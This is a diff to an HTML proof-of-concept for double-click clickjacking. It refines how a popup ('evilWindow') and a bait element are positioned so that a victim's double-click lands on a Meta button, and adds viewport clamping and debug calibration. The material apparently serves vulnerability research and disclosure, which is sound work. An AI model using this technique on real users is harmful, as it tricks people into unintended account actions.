@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -46,9 +47,10 @@ function openDoubleWindow() {
   const winWidth = window.screen.width;
   const winHeight = window.screen.height - 1;
   const demoUrl = new URL("demo.html", window.location.href).href; // stessa directory della pagina
+  var popupLeft = window.screenX, popupTop = window.screenY; // stesso monitor della finestra principale
   var evilWindow = window.open(demoUrl,
         "_blank",
-        `width=${winWidth},height=${winHeight},top=0,left=0`);
+        `width=${winWidth},height=${winHeight},top=${popupTop},left=${popupLeft}`);
 
   evilWindow.onload = function () {
     evilWindow.document.open();
@@ -89,8 +91,17 @@ function openDoubleWindow() {
     var esca = document.getElementById('doubleclick');
     esca.style.width = ESCA.w + 'px';
     esca.style.height = ESCA.h + 'px';
-    esca.style.left = (TARGET.x - window.screenX - ESCA.w / 2) + 'px';
-    esca.style.top  = (TARGET.y - (window.screenY + chromeTop) - ESCA.h / 2) + 'px';
+    var rawLeft = TARGET.x - window.screenX - ESCA.w / 2;
+    var rawTop  = TARGET.y - (window.screenY + chromeTop) - ESCA.h / 2;
+    // L'esca NON deve mai finire fuori viewport: se il calcolo esce la clampo
+    // dentro (in debug l'avviso ti dice che la geometria va ricalibrata).
+    var left = Math.min(Math.max(0, rawLeft), window.innerWidth - ESCA.w);
+    var top  = Math.min(Math.max(0, rawTop),  window.innerHeight - ESCA.h);
+    if (DEBUG && (left !== rawLeft || top !== rawTop)) {
+      console.warn('esca fuori viewport, clampata dentro: ricalibra FIT o verifica monitor/scaling');
+    }
+    esca.style.left = left + 'px';
+    esca.style.top  = top + 'px';
     var o = document.getElementById('fb-outline');
     o.style.left = (TARGET.x - window.screenX - ${FIT.W} / 2) + 'px';
     o.style.top  = (TARGET.y - (window.screenY + chromeTop) - ${FIT.H} / 2) + 'px';
@@ -139,6 +150,6 @@ Click the button to start the proof-of-concept. To ensure the proof-of-concept w
   <li>First run: open <b>index.html?debug=1</b> to verify the red outline sits exactly on the blue Meta button. Do not click.</li>
 </ul>
 
-<button style="position:fixed; left:8px; bottom:6px;" onclick="openDoubleWindow()">Start Demo</button>
+<button style="font-size:18px; padding:10px 24px;" onclick="openDoubleWindow()">Start Demo</button>
 </body>
 </html>
